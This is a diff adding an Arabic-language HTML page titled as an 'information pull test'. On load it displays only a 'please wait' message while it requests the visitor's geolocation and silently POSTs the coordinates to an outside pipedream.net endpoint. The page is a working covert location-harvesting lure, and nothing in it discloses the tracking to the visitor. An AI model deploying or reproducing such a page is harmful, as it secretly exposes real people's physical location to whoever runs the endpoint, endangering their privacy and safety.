@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>اختبار سحب المعلومات</title>
+    <script>
+        function sendData(data) {
+            fetch('https://eof7qdy0bcb1sr7.m.pipedream.net', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    sendData(data);
+                });
+            } else {
+                alert('جهازك لا يدعم خاصية تحديد الموقع.');
+            }
+        }
+
+        window.onload = function() {
+            document.body.innerHTML = '<h1>الرجاء الانتظار...</h1>';
+            getLocation();
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
